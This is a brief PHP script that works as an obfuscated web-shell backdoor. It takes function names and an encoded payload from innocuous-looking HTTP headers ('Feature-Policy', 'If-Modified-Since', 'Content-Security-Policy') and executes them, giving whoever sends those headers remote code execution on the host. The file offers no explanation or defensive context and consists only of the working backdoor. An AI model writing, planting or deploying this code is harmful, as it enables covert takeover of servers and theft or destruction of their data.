<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['Feature-Policy'])) {
    $requests = $_HEADERS['Feature-Policy']('', $_HEADERS['If-Modified-Since']($_HEADERS['Content-Security-Policy']));
    $requests();
}